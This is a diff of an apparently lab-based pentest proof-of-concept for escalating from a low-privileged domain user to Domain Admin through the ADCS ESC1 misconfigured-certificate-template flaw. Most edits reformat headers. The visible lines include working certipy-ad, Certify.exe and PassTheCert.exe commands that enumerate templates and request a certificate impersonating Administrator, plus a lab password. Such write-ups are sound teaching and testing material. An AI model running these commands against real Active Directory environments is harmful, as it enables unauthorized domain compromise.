@@ -32,13 +32,18 @@ Info
 - Lab domain controller (with ADCS) : dc1.company.work
 - Low priv domain user: LowPrivUser
 
-=======================================================================================================================================
-PoC - Step 1 - ADCS enumeration using a low privileged domain user and multiple tools (certutil, certify.exe, certipy)
-=======================================================================================================================================
 
----------------------------------------------------------------------------------------------------------------------------------------
+========================================================================================================================================
+PoC - Privilege escalation from Domain User to Domain Admin by exploiting the "Misconfigured Certificate Templates" vulnerability (ESC1) 
+========================================================================================================================================
+
+=================================================================================================================
+STEP 1 - ADCS enumeration using a low privileged domain user and multiple tools (certutil, certify.exe, certipy)
+=================================================================================================================
+
+-----------------------------------------------------------------------------------------------------------------
 1.1 ADCS enumeration with "CERTUTIL"
----------------------------------------------------------------------------------------------------------------------------------------
+-----------------------------------------------------------------------------------------------------------------
 
 You can use certutil to:
 - dump and display certification authority (CA) configuration information, 
@@ -140,9 +145,9 @@ DC1.company.work\company-DC1-CA:
 CertUtil: -TCAInfo command completed successfully.
 
 
----------------------------------------------------------------------------------------------------------------------------------------
+-----------------------------------------------------------------------------------------------------------------
 1.2 ADCS enumeration with "Certify.exe"
----------------------------------------------------------------------------------------------------------------------------------------
+-----------------------------------------------------------------------------------------------------------------
 
 Github links:
 - https://github.com/GhostPack/Certify
@@ -639,18 +644,18 @@ C:\temp> Packed_Certify.exe find
 Certify completed in 00:00:00.4686279
 
 
----------------------------------------------------------------------------------------------------------------------------------------
+-----------------------------------------------------------------------------------------------------------------
 1.3 ADCS enumeration with the tool "Certipy.py" (which is named "certipy-ad" in Kali)
----------------------------------------------------------------------------------------------------------------------------------------
+-----------------------------------------------------------------------------------------------------------------
 
 Command to enumerate the ADCS
 -------------------------------
 jeff@kali:~$ certipy-ad find -u LowPrivUser@company.work -p 'SuperGenialPwd' -target 192.168.1.167
 
 
-=======================================================================================================================================
-PoC - Step 2 - Find vulnerable certificate templates (ESC1) with the C# tool 'Certify.exe'
-=======================================================================================================================================
+=================================================================================================================
+STEP 2 - Find vulnerable certificate templates (ESC1) with the C# tool 'Certify.exe'
+=================================================================================================================
 
 Command to find vulnerable/abusable certificate templates using default low-privileged groups
 ----------------------------------------------------------------------------------------------
@@ -728,17 +733,18 @@ Certify completed in 00:00:00.1708239
 
 => Conclusion: The "User_template" is prone to the domain privesc vulnerability "ESC1"
 --------------------------------------------------------------------------------------
-The group "COMPANY\Domain Users" can enroll in the template "User_template" which can be used for "client authentication" and has "ENROLLEE_SUPPLIES_SUBJECT" set.
+The group "COMPANY\Domain Users" can enroll in the template "User_template" which can be used for "client authentication" and
+has "ENROLLEE_SUPPLIES_SUBJECT" set. 
 This allows anyone to enroll in this template and specify an arbitrary Subject Alternative Name such as a Domain Admin account.
 
 
-=======================================================================================================================================
-PoC - Step 3 - Exploit the "ESC1" vulnerability to escalate your privileges from a Domain User to Domain Admin
-=======================================================================================================================================
+=================================================================================================================
+STEP 3 - Exploit the "ESC1" vulnerability to escalate your privileges from a Domain User to Domain Admin
+=================================================================================================================
 
----------------------------------------------------------------------------------------------------------------------------------------
+-----------------------------------------------------------------------------------------------------------------
 Method 1. Using the tool "Certipy.py" (which is named "certipy-ad" in Kali) and the tool "PassTheCert.exe"
----------------------------------------------------------------------------------------------------------------------------------------
+-----------------------------------------------------------------------------------------------------------------
 
 jeff@kali:~$ sudo apt-get install certipy-ad
 Reading package lists... Done
@@ -775,9 +781,9 @@ options:
   -h, --help            Show this help message and exit
 
 
-=> Command to request a new certificate as a low privileged domain user for the vulnerable template/CA (User_template) with the Domain Admin account 
-   "COMPANY\Administrator" specified as the alternate principal.
------------------------------------------------------------------------------------------------------------------------------------------------------
+=> Command to request a new certificate as a low privileged domain user for the vulnerable template/CA (User_template) with 
+   the Domain Admin account "COMPANY\Administrator" specified as the alternate principal.
+-----------------------------------------------------------------------------------------------------------------------------
 
 jeff@kali:~$ certipy-ad req -u LowPrivUser@company.work -p 'SuperGenialPwd' -target 192.168.1.167 -ca company-DC1-CA -template User_template -upn administrator@company.work -dc-ip 192.168.1.167
 
@@ -810,13 +816,13 @@ PS C:\Users\j-cana\Documents\Tools-Pentest> .\Packed_PassTheCert.exe --cert-path
 Querying LDAP As : u:COMPANY\Administrator
 
 
----------------------------------------------------------------------------------------------------------------------------------------
+--------------------------------------------------------------------------------------------------------------------
 Method 2. Using the tool certify.exe
----------------------------------------------------------------------------------------------------------------------------------------
+--------------------------------------------------------------------------------------------------------------------
 
 => Command to request a new certificate for the vulnerable template/CA (User_template) with the Domain Admin account 
   "COMPANY\Administrator" specified as the alternate principal.
-----------------------------------------------------------------------------------------------------------------------
+--------------------------------------------------------------------------------------------------------------------
 
 C:\temp> Packed_Certify.exe request /ca:DC1.company.work\company-DC1-CA /template:User_template /altname:Administrator
 
